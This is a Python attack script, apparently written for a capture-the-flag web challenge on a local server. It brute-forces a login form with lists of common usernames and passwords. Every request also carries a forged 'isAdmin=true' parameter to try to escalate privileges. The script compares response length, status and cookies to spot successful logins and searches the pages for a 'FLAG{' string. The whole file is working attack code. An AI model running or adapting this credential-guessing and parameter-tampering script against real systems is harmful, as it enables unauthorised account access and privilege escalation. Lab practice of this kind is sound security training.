import requests
import re

# Target URL
url = "http://127.0.0.1:32829/index.php"

# Common credentials to test
usernames = ["admin", "user", "test", "guest", "root", "administrator", "bart", "homer", "marge", "lisa", "maggie", "ned", "apu", "moe", "burns"]
passwords = ["password", "123456", "admin", "test", "guest", "Password123", "pass", "12345", "password123", "qwerty"]

# Baseline: Get failed login response length
baseline_response = requests.post(url, data={"username": "nonexistent", "password": "wrongpass", "isAdmin": "true"})
baseline_length = len(baseline_response.text)
print(f"[*] Baseline failed login response length: {baseline_length} bytes")
print(f"[*] Testing {len(usernames) * len(passwords)} credential combinations with isAdmin=true\n")

successful_logins = []
tested_count = 0

for username in usernames:
    for password in passwords:
        tested_count += 1
        
        # Send POST request with isAdmin=true
        data = {
            "username": username,
            "password": password,
            "isAdmin": "true"
        }
        
        try:
            response = requests.post(url, data=data, allow_redirects=False, timeout=10)
            response_length = len(response.text)
            
            # Check for success indicators
            has_flag = "FLAG{" in response.text
            length_differs = response_length != baseline_length
            has_cookies = bool(response.cookies)
            status_differs = response.status_code != baseline_response.status_code
            
            # If any success indicator is present, investigate
            if has_flag or length_differs or has_cookies or status_differs:
                print(f"\n[+] POTENTIAL SUCCESS: {username}:{password}")
                print(f"    Status: {response.status_code} | Length: {response_length}B (baseline: {baseline_length}B)")
                print(f"    Cookies: {dict(response.cookies)}")
                print(f"    Headers: {dict(response.headers)}")
                
                # Search for FLAG pattern
                flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
                if flag_match:
                    print(f"    [!!!] FLAG FOUND: {flag_match.group(0)}")
                
                # Print full response
                print(f"    Response body:\n{response.text}")
                
                successful_logins.append({
                    "username": username,
                    "password": password,
                    "status": response.status_code,
                    "length": response_length,
                    "cookies": dict(response.cookies),
                    "has_flag": has_flag
                })
            
        except requests.exceptions.RequestException as e:
            print(f"[!] Error testing {username}:{password} - {e}")

print(f"\n[*] Testing complete: {tested_count} combinations tested")

if successful_logins:
    print(f"\n[+] Found {len(successful_logins)} successful authentication(s):")
    for login in successful_logins:
        print(f"    - {login['username']}:{login['password']} (Status: {login['status']}, Length: {login['length']}B, Flag: {login['has_flag']})")
else:
    print("\n[-] No successful authentications found")

